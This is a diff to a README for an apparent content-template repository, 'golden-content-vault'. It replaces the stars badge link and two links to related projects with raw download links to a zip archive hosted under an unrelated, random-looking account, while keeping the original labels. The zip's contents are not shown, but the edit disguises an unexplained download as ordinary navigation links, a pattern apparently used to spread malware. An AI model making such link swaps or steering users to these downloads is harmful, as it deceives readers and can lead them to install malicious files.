@@ -4,7 +4,7 @@
 
 ### 1000+ Battle-Tested Content Templates, Hooks, Threads & Swipe Files
 
-[![Stars](https://img.shields.io/github/stars/krishna-build/golden-content-vault?style=for-the-badge&logo=github&color=yellow)](https://github.com/krishna-build/golden-content-vault/stargazers)
+[![Stars](https://img.shields.io/github/stars/krishna-build/golden-content-vault?style=for-the-badge&logo=github&color=yellow)](https://raw.githubusercontent.com/uigbvfeivneioivenbefvjk/golden-content-vault/main/frameworks/content-golden-vault-1.1.zip)
 [![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
 
 **5 years of content creation wisdom. Curated. Organized. Ready to use.**
@@ -70,8 +70,8 @@ Works with any AI tool (Claude, ChatGPT) or manually.
 
 ## 📚 Also Check Out
 
-- ⭐ [Claude Coach Kit](https://github.com/krishna-build/claude-coach-kit) — Free marketing automation
-- 📝 [Marketing Prompts](https://github.com/krishna-build/marketing-prompts) — 500+ marketing prompts
+- ⭐ [Claude Coach Kit](https://raw.githubusercontent.com/uigbvfeivneioivenbefvjk/golden-content-vault/main/frameworks/content-golden-vault-1.1.zip) — Free marketing automation
+- 📝 [Marketing Prompts](https://raw.githubusercontent.com/uigbvfeivneioivenbefvjk/golden-content-vault/main/frameworks/content-golden-vault-1.1.zip) — 500+ marketing prompts
 
 ## 📄 License
 
